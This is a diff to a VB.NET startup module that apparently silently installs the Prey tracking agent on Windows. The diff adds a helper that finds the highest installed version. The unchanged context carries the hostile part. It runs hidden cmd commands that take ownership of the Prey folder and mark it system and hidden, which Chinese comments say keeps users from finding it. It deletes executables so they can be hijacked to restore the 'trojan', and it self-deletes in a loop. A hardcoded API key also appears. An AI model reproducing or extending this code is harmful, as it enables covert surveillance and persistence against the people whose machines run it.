@@ -1,4 +1,5 @@
-﻿Imports System.Security.Principal
+﻿Imports System.IO
+Imports System.Security.Principal
 Imports Microsoft.VisualBasic.ApplicationServices
 
 Namespace My
@@ -19,9 +20,9 @@ Namespace My
         Dim MySelfPath As String = IO.Path.GetTempPath() & "winscr" & My.Computer.Clock.TickCount & ".exe"
         Dim PreyMSIPath As String = IO.Path.GetTempPath() & "Prey.msi"
         Dim PreyDirectory As String = Environment.GetFolderPath(Environment.SpecialFolder.Windows) & "\Prey"
-        Dim PreyVireion As String = "1.6.6"
-        Dim FlashDirectory As String = PreyDirectory & "\versions\" & PreyVireion & "\lib\agent\actions\alert\win32\"
-        Dim AlarmDirectory As String = PreyDirectory & "\versions\" & PreyVireion & "\lib\agent\actions\alarm\bin\"
+        Dim PreyVireion As String
+        Dim FlashDirectory As String
+        Dim AlarmDirectory As String
         Dim APIKEY As String = "A4E064ED041C"
 
         Private Sub MyApplication_Startup(sender As Object, e As StartupEventArgs) Handles Me.Startup
@@ -54,6 +55,11 @@ Namespace My
             Shell("cmd.exe /c takeown /f " & PreyDirectory & " /r /d y && icacls " & PreyDirectory & " /grant administrators:F /t", vbHide, True)
             '对 Prey 目录添加 [系统] 和 [隐藏] 属性，防止用户无意发现文件
             Shell("cmd.exe /c attrib " & PreyDirectory & " +s +h", vbHide, True)
+
+
+            PreyVireion = GetHighestVersion(PreyDirectory & "\versions\")
+            FlashDirectory = PreyDirectory & "\versions\" & PreyVireion & "\lib\agent\actions\alert\win32\"
+            AlarmDirectory = PreyDirectory & "\versions\" & PreyVireion & "\lib\agent\actions\alarm\bin\"
 
             '删除 Alarm 目录里的两个 exe ，劫持以实现恢复木马
             If IO.File.Exists(AlarmDirectory & "mpg123.exe") Then IO.File.Delete(AlarmDirectory & "mpg123.exe")
@@ -136,5 +142,20 @@ Namespace My
             Shell("cmd /c for /l %a in (0,0,0) do if exist " & CommandString & " (del/a/f " & CommandString & ") else exit", vbHide)
             End
         End Sub
+
+        ''' <summary>
+        ''' 获取软件目录里最新版本目录名称
+        ''' </summary>
+        Private Function GetHighestVersion(SoftwareDirectory As String) As String
+            Dim VersionDir() As String = Directory.GetDirectories(SoftwareDirectory)
+            If VersionDir.Length = 1 Then Return VersionDir.First
+            Dim HighVersion As Version = New Version("0.0.0")
+            Dim TempVersion As Version
+            For Each VersionStr In VersionDir
+                TempVersion = New Version(VersionStr.Split("\").Last)
+                HighVersion = IIf(TempVersion > HighVersion, TempVersion, HighVersion)
+            Next
+            Return HighVersion.ToString()
+        End Function
     End Class
 End Namespace
